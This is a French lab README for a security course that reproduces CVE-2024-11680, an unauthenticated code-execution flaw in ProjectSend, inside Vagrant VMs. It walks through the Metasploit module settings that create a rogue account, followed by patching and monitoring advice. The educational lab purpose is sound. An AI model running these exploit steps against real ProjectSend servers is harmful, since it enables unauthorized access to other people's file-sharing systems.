
## Description de la faille

* Service compromis : ProjectSend: Unauthenticated Remote Code Execution

> ProjectSend est une application web gratuite de partage de fichiers privés, orientée vers les clients, elle presente une vulnérabilité de type `Unauthenticated Remote Code Execution`pour es versions précédentes à **r1720**. Des attaquants distants peuvent exploiter cette vulnérabilité en envoyant des requêtes HTTP faites sur mesure, modifier le fichier `options.php` et ainsi permettre l'accès à des modifications aux configurations de l'application.

* la vulnérabilité 

En pratique, l'application ProjectSend implémente différents niveaux d'autorisation pour limiter les utilisateurs aux fonctionnalités qui leur sont réservées, le script `header.php` vérifie que l'utilisateur est bien connecté et qu'il a bien le bon niveau de privilège. Le script est donc de la forme suivante :

``` php
<?php
// ...
// Check for an active session
redirect_if_not_logged_in();
// Check if the current user has permission to view this page.
redirect_if_role_not_allowed($allowed_levels);
```

Malheureusement, sur plusieurs pages PHP de l'application, cette vérification est réalisée après l'action demandée par l'utilisateur et que le code soit exécuté; le script `option.php` qui est responsable de la mise à jour des configurations de l'application, connaît ce bug. Ainsi, en envoyant une simple **requête** bien fabriquée, il est possible de créer des comptes utilisateur.

Le README décrit étape par étape comment réaliser l'attaque sous un systeme hote de type Linux si vous travailler sous Windows veillez voir les instruction dans ./Windows_host.md

* architecture typique du système d’information qui pourrait être impliquée dans l’exploitation de cette faille.
```plaintext
                 +--------------------+
                 |  Client Utilisateur|
                 |--------------------|
                 | - Navigateur web   |
                 +--------------------+
                           |
                           | HTTP/HTTPS
                           v
                 +--------------------+
                 |     Firewall       |
                 +--------------------+
                           |
                           | Réseau public
                           v
                 +--------------------+
                 | Serveur Web Apache |
                 |--------------------|
                 | - ProjectSend      |
                 +--------------------+
                           |
                           | Réseau interne sécurisé
                           v
                 +--------------------+
                 | Serveur Base de    |
                 | Données (MySQL)    |
                 |--------------------|
                 | - Stockage données |
                 +--------------------+
                           |
                           | Sauvegarde
                           v
                 +--------------------+
                 |   Stockage Backup  |
                 +--------------------+
```

# Repertoire Target_host
** lancer la cible 
vagrant up

```
le script Set-vuln-app.sh construit l'infrastructure cible lors de la provisionnement de la VM il n'ya rien a faire jusqu'a la fin du script
```

* se connecter au serveur en CLI
vagrant ssh  

* connecter la PC hote à un hostpot(simple) maitriser comme celui d'un smartphone pour avoir une adresse IPv4 sur l'interface WLAN dans la VM

* associer cet IPv4 a un nom de domain
`ifconfig`   # n'hesitez pas à faire `sudo dhclient` si l'interface WLAN n'a pas encore une IPv4 comme ici
```
vagrant@Ubuntu-projectsent-Target:~$ ifconfig 
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fd00::99:41ff:fee5:29ce  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::99:41ff:fee5:29ce  prefixlen 64  scopeid 0x20<link>
        ether 02:99:41:e5:29:ce  txqueuelen 1000  (Ethernet)

enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:1:0:a00:27ff:fe22:3e4d  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a00:27ff:fe22:3e4d  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:22:3e:4d  txqueuelen 1000  (Ethernet)

vagrant@Ubuntu-projectsent-Target:~$ sudo dhclient
RTNETLINK answers: File exists

vagrant@Ubuntu-projectsent-Target:~$ ifconfig 
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fd00::99:41ff:fee5:29ce  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::99:41ff:fee5:29ce  prefixlen 64  scopeid 0x20<link>
        ether 02:99:41:e5:29:ce  txqueuelen 1000  (Ethernet)
    

enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.10.4  netmask 255.255.255.240  broadcast 172.20.10.15
        inet6 2001:db8:1:0:a00:27ff:fe22:3e4d  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a00:27ff:fe22:3e4d  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:22:3e:4d  txqueuelen 1000  (Ethernet)
```

* associer le nom du domain a l'ip dans le LAN
`sudo nano /etc/hosts`
`Ip_addr christian-sacha.com` comme ici ou 172.20.10.4 est l'ip du serveur 
```
vagrant@Ubuntu-projectsent-Target:~$ cat /etc/hosts
127.0.0.1	localhost

# The following lines are desirable for IPv6 capable hosts
::1	ip6-localhost	ip6-loopback
fe00::0	ip6-localnet

127.0.2.1 Ubuntu-projectsent-Target Ubuntu-projectsent-Target
172.20.10.4 christian-sacha.com
```

* tester avec un ping 
`ping christian-sacha.com`

* installer l'app avec un compte admin dans un navigateur depuis la machine hote (de preference chrome)
`http://localhost:8080/`  et enter infos pour l'admin comme [ici](./Target-host/install_app.png)

* definir l'URI sur le nom de domaine
dans l'app: `Options > General options > System URI`
définir System URI à `http://christian-sacha.com/`    et `valider`

* créer un user comme [ici](./Attack-host/add_client.png) 

*************** check les logs apache si necceassaires( mais vraiment que si en cas de besoin) 
```
vagrant shh   # pour ouvrir un deuxieme terminal depui l'hote
sudo tail -f /var/log/apache2/error.log
sudo tail -f /var/log/apache2/access.log
```



# Rélisation de l'attaque: Repertoire Attack_host
* lancer l'attaque 
`vagrant up`

* connection à la VM user `vagrant` passwd `vagrant`
* se connecter au hostpot    # si pas encore fait

* associer le nom du domain et l'ip du serveur projectsend pour simuler une resolution DNS 
`sudo nano /etc/hosts` 
`Ip_addr_serveur christian-sacha.com` comme dans cette exemple avec 172.20.10.4 l'ip du serveur
```
┌──(vagrant㉿Kali-projectsent-Attack)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali.'"''       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.2.1 Kali-projectsent-Attack Kali-projectsent-Attack
172.20.10.4 christian-sacha.com
```

* tester avec un ping 
`ping christian-sacha.com`

* verifier qu'on a bien access à l'app sur le reseau, dans un navigateur:
`http://christian-sacha.com/` avec le user `client` pass `client`
comme [ici](./Attack-host/client_connected.png)

* lancer l'exploit
`msfconsole`
* Charger l'exploit
`use exploit/linux/http/projectsend_unauth_rce` # si jamais une erreur se produit comme quoi le module n'existe pas sortir de msfconsole `exit` et faire sudo `apt install -y metasploit-framework` puis entrer a nouveau `msfconsole`

* Configurer l'exploit et definir la cible   # ça ressemble à ça
```
set RHOSTS <ip_du_serveur_projectsend>
set RPORT 80
set TARGETURI /
set PAYLOAD php/exec
set CMD "touch /tmp/exploit_success"
show targets     # ex de sortie
set TARGET <target-id>  # il faut Remplacer <target-id> par l'id de de la cible
```
un exmple des commandes à effectuer sont fournies [ici](./Attack-host/exploit_cmd.png)

* lancer l'exploit `exploit` le resultat est similaire à [exploit_result](./Attack-host/exploit_result.png)

ou l'utilisateur william a été crée avec son pass `User william created with password SubehADw` 

* verifier qu'on a desormais access à l'app avec le user creer
`http://christian-sacha.com/`  , on voit bien ici que un compte hacker est connectée [hacker_connected](./Attack-host/hacker_connected.png)


# Exploitation 
Une fois le hacker a reussi l'exploit se connecter à l'app `http://christian-sacha.com/` avec le compte admin avec user `admin` et pass `admin`
* definir les actions des clients dans l'application: `Options > Clients > Files`  comme  [ici](./Attack-host/define_clients_actions.png) et `enregistrer`

* se connecter avec le compte hacker pour bien verifier qu'on peut bien upload les fichiers comme [ici](./Attack-host/hacker_actions.png)

* pour tout nettoyer a la fin `vagrant destroy -f` dans les repertoires Target_host et Attack_host


### Limiter l’impact de l’exploitation de la faille

En tant qu'administrateur, la première chose à mettre en place en connaissance de la faille est de mettre à jour ProjectSend vers la version r1720 ou ultérieure pour corriger au plus vite cette vulnérabilité. Le patch donnant la correction de la faille est depuis longtemps (16 mai 2023 !) disponible sur le dépôt [GituHub](https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744) de ProjectSend. Si la mise à jour n'est possible dans les plus brefs délais, alors il est possible de mettre en place certaines des actions suivantes :

* **Vérification des systèmes** : il faut ponctuellement vérifier les systèmes pour détecter toute activité suspecte. On peut chercher dans les journaux, les fichiers, ou les configurations pour vérifier si des actions malveillantes ont déjà eu lieu. On peut chercher la présence de webshells dans le répertoire `upload/files/` ou des modifications non autorisées dans `option.php`.

* **Surveillance** : dépuis l'app il est possible de surveiller les journaux d'accès et d'erreurs en temps réel pour détecter d'eventuels intrusions, des requêtes inhabituelles nottament vers options.php ou d'autres comportements anormaux et apportée les corrections. On peut mettre en place ces solution de monitoring avec un SIEM tel que **AlienVault USM** ou **Splunk**, **aussi en CLI** 
```
vagrant shh   # pour ouvrir un deuxieme terminal depui l'hote
sudo tail -f /var/log/apache2/error.log
sudo tail -f /var/log/apache2/access.log
```

### Empêcher/limiter l'exploitation de la faille ??

En tant qu'administrateur, la première chose à mettre en place en connaissance de la faille est de mettre à jour ProjectSend vers la version r1720 ou ultérieure pour corriger au plus vite cette vulnérabilité. Le patch donnant la correction de la faille est depuis longtemps (16 mai 2023 !) disponible sur le dépôt [GituHub](https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744) de ProjectSend. Si la mise à jour n'est possible dans les plus brefs délais, alors il est possible de mettre en place certaines des actions suivantes :

* **Vérification des systèmes** : il faut ponctuellement vérifier les systèmes pour détecter toute activité suspecte. On peut chercher dans les journaux, les fichiers, ou les configurations pour vérifier si des actions malveillantes ont déjà eu lieu. On peut chercher la présence de webshells dans le répertoire `upload/files/` ou des modifications non autorisées dans `option.php`.

* **Surveillance** : dépuis l'app il est possible de surveiller les journaux d'accès et d'erreurs en temps réel pour détecter d'eventuels intrusions, des requêtes inhabituelles nottament vers options.php ou d'autres comportements anormaux et apportée les corrections. On peut mettre en place ces solution de monitoring avec un SIEM tel que **AlienVault USM** ou **Splunk**, **aussi en CLI** 
```
vagrant shh   # pour ouvrir un deuxieme terminal depui l'hote
sudo tail -f /var/log/apache2/error.log
sudo tail -f /var/log/apache2/access.log
```

* mettre projecsend à jour vers la version 1720
* Analyse statique et dynamique de codes qui peut mettre sur pieds des mecanismes comme filtrer les entrées, limiter les injections SQL

Sans mettre à jour l'application ProjectSend, il est possible de :

* limiter certaines actions des clients dans l'app ce qui qui peut limiter la possibilité aux utilisateurs d'envoyer des requêtes à la base de donnée.

* Fonctions de sécurité : plusieurs niveaux d'authentification sont mis en place pour avoir plus ou moins d'accès à la gestion de l'application. En tant qu'administrateurs, d'autres fonctionnalités sont disponibles comme par exemple :



## Glossaire

* **CVSS** (Common Vulnerability Scoring System) : cadre standardisé pour mesurer la sévérité d'une faille de sécurité d'un système d'information. Le score obtenu est compris entre 0 et 10, 10 étant le cas le plus sévère. 

* **TOE** (Target Of Evaluation) : évaluation de la cible (ici le système d'information) qui permet de vérifier les fonctionnalités de sécurité. Cela est fait à travers le **Protection Profile**, la **Security Target**, les **Security Functional Requirements**, les **Security Assurance Requirements** et

* **Security Target** (ST) : la cible de sécurité est le document qui identifie les propriétés de sécurité de la TOE. On retrouve le périmêtre de la vertification, les bien à proteger, les menaces...

* [**SIEM**](https://fr.wikipedia.org/wiki/Security_information_and_event_management) (Security Information and Event Management) : c'est un domaine de la sécurité informatique combinant la gestion des **informations de sécurité** (SIM) et la gestion des **événements de sécurité** (SEM) pour ainsi fournir une analyse en temps réel des alertes de sécurité générées par les applications et le matériel réseau.

* **DNS** (Domain Name Systeme) : service informatique distribué qui associe les noms de domaine Internet avec leurs adresses IP 
* **Proxy** : composant logiciel informatique qui joue le rôle d'intermédiaire en se plaçant entre deux hôtes pour faciliter ou surveiller leurs échanges (généralement entre un utilisateur et internet).
* **reverse_proxy:** serveur intermédiaire qui reçoit les requêtes des clients et les transmet aux serveurs backend appropriés; Contrairement au proxy classique qui protège les clients, un reverse proxy protège les serveurs en gérant le trafic entrant
* **Architecture client--serveur:** modèle informatique où un client (ex : un navigateur web) envoie des requêtes à un serveur (ex : Apache + ProjectSend)
* **LAMP:** ensemble de technologies open-source utilisées pour héberger des applications web constitué entre autres de Linux-Apache-MySQL/MARIABDB-PHP
* **Analyse statique et dynamisue de codes:** qui peut mettre sur pieds des mecanismes comme filtrer les entrées, les injections SQL
```
Analyse statique : Consiste à analyser le code source sans l’exécuter, en cherchant des vulnérabilités potentielles comme des injections SQL.
Analyse dynamique : Consiste à tester l'application en temps réel en exécutant du code et en observant son comportement.
```
* **filter les entrées:** suite d'étapes qui peut comporter
```
Validation des données (ex : empêcher un utilisateur d’envoyer un script malveillant dans un champ de texte).
Sanitization : Nettoyer les entrées pour supprimer les caractères dangereux.
```
* **injections SQL:**  attaque où un attaquant insère du code SQL malveillant dans une requête.
* **Unauthenticated Remote Code Execution:** Une faille permettant d'exécuter du code arbitraire sur un serveur distant sans authentification
* **App Web:** programme accessible via un navigateur, sans installation locale, dans notre cas c'est un filesender
* **Deployer une App sur Apache:** mettre une application en ligne pour qu’elle soit accessible via un navigateur; Les étapes sont founis dans le scrit ./Target-host/Set-vuln-app.sh
* **Environnement serveur:** ensemble des outils et configurations qui permettent à une application de fonctionner ex OS(serveur),serveur Web,BD
* **Nom de domaine:** Une adresse unique permettant d’accéder à un serveur via un nom plutôt qu’une adresse IP
* **URI (Uniform Resource Identifier):** est une chaîne qui identifie de manière unique une ressource sur un serveur
* **IPS(Intrusion Prevention System):** Système qui détecte et bloque automatiquement les attaques réseau ex **SNORT**
* **IDS(Intrusion Detection System):** Système qui surveille le trafic et génère des alertes lorsqu’une menace est détectée ex **Fail2Ban**

**********
****************
# References
*****************
* [**Nist**](https://nvd.nist.gov/vuln/detail/CVE-2024-11680) pour une vue globale de la faille, avec de nombreux liens vers d'autres ressources.

**info sur la faille et telechargement**
* [**Site officiel de ProjectSend**](https://www.projectsend.org/) pour en savoir plus sur l'application compromise.
* [**github projecsend**](https://github.com/projectsend/projectsend/releases) pour telecharger 
* [**fichier options.php**](https://github.com/projectsend/projectsend/blob/develop/options.php) qui presente la vulnérabilté
* [**Synacktiv**](https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf) pour une description technique de la faille
* https://www.rapid7.com/db/modules/exploit/linux/http/projectsend_unauth_rce/  explication exploit metasploit
* dans metasploit `msf6 > search payload php` ; `msf6 > info payload [nom_du_payload]` info sur exploit et le type de payload complementaire pour la réalisée
* Le cours [**Sécurité des Systèmes d'Information**](https://chamilo.grenoble-inp.fr/courses/PHELMA5PMISSI1/) pour globalement toutes les notions abordées dans ce document.

* Wikipedia pour les définitions de la [**TOE**](https://en.wikipedia.org/wiki/Common_Criteria) et la [**ST**](https://en.wikipedia.org/wiki/Security_Target).

**pour réaliser l'attaque**
* [**Dépôt Github**](https://github.com/D3N14LD15K/CVE-2024-11680_PoC_Exploit) qui donne un moyen de réaliser l'exploit.
* https://gist.github.com/phoenixinlinux/c62c40080187aaffa5654d1698ed3286
* https://www.howtoforge.com/how-to-install-projectsend-with-nginx-on-ubuntu-20-04/
* https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html
* https://www.offsec.com/metasploit-unleashed/php-meterprete
*******************


